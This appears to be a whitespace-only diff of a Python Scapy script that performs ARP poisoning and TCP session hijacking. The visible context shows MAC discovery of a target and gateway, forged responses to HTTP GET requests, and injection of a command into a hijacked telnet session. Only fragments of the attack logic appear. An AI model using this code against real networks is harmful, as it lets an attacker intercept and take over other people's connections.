@@ -17,8 +17,8 @@ PROTO = ""
 CMD = ""
 STOP_SNIFF = False
 
-def forge_response(p, proto):
 
+def forge_response(p, proto):
     # Switch direction of packet
     ether = Ether(src=p[Ether].dst, dst=p[Ether].src)
     ip = IP(src=p[IP].dst, dst=p[IP].src)
@@ -44,7 +44,7 @@ def forge_response(p, proto):
         response = ether / ip / tcp / http
 
     elif proto == 'telnet':
-        
+
         print(f"Received: SEQ {p[TCP].seq}, ACK {p[TCP].ack}, Payload {p[TCP].payload}")
 
         ip_total_len = p[IP].len
@@ -70,7 +70,6 @@ def forge_response(p, proto):
 
 
 def hijack(p):
-
     if PROTO == 'http':
         if 'GET' in str(p):
             response = forge_response(p, 'http')
@@ -86,6 +85,7 @@ def hijack(p):
             sendp(cmd, verbose=0, iface=IFACE)
 
             sys.exit(0)
+
 
 def main():
     global GATEWAY_MAC, _SRC_DST, MY_MAC, MY_IP, PROTO, CMD, IFACE
@@ -129,21 +129,21 @@ def main():
     print()
 
     print(f"[+] Determining target and gateway MAC address.")
-    
+
     result = arp_poisoning.arp_scan(args.target, args.interface)
     if not result:
         print("\tCannot determine target MAC address. Are you sure the IP is correct?")
         sys.exit(1)
     else:
         targetMAC = result[0]['MAC']
-    
+
     result = arp_poisoning.arp_scan(args.gateway, args.interface)
     if not result:
         print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
         sys.exit(1)
     else:
         gatewayMAC = result[0]['MAC']
-    
+
     # Define packet forwarding source and destination
     GATEWAY_MAC = gatewayMAC
     _SRC_DST = {
